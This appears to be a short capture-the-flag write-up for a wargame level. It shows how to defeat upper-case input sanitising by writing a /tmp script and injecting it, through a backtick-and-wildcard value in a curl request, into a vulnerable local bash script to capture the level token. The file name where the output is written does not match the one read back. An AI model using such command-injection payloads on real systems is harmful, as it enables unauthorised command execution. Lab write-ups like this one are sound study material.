# level12

- Our input is once again passed in a bash script so we can try to escape it

- Our input is "sanitized" so everything is capitalized we need to create a
    script to execute getflag but with the name in uppercase like `/tmp/SCRIPT`
    ```sh
    $ cat /tmp/SCRIPT
    #!/bin/bash
    getflag > /tmp/level11
    $ chmod +x /tmp/SCRIPT
    ```

- Now we can exploit it but we can't type any dir name in lowercase in replacement
    we can use the wilcard to call `/*/SCRIPT`
    ```sh
    curl 0:4646?x='`/*/SCRIPT`'
    ```

- `$ cat /tmp/lvl11`
    > Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

